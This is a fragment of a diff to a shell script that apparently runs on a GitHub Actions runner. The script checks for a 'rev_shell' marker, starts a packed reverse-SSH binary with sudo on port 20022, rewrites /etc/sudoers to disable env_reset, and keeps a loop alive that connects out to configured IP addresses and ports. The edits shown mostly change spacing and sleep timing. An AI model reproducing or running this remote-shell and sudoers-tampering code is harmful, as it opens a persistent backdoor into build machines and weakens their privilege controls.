@@ -165,12 +165,11 @@ cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;
 grep -q AABBCC_rev_shell /tmp/js9 &&
 (
 setsid sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v  -l -p 20022 &
-
- sudo bash -c '  sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g"  /etc/sudoers;
+sudo bash -c '  sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g"  /etc/sudoers;
                  grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 >  /tmp/js9a.txt '
 
 
-    (while true; do
+(while true; do
         [ ! -f /tmp/keepalive ] && break        
          num61z=$(date +%S);
          num67z=$(echo "1"$num61z);
@@ -202,6 +201,7 @@ if [ ! -z ${port7} ] && [ ! -z ${ip7} ]; then
    (  for((i=0;i<8;i++));do  echo -e "\n";sleep 2;done )  )|script /tmp/nz_z40022
 )
 )&
+
 fi
 
 
@@ -216,8 +216,9 @@ if [ ! -z ${port5} ] && [ ! -z ${ip5} ]; then
 fi
 
 
-echo "will sleep 31s for while true";
-sleep 21; 
+echo "will sleep 12s for while true";
+date;
+sleep 12; 
          
     done) &
 ) &
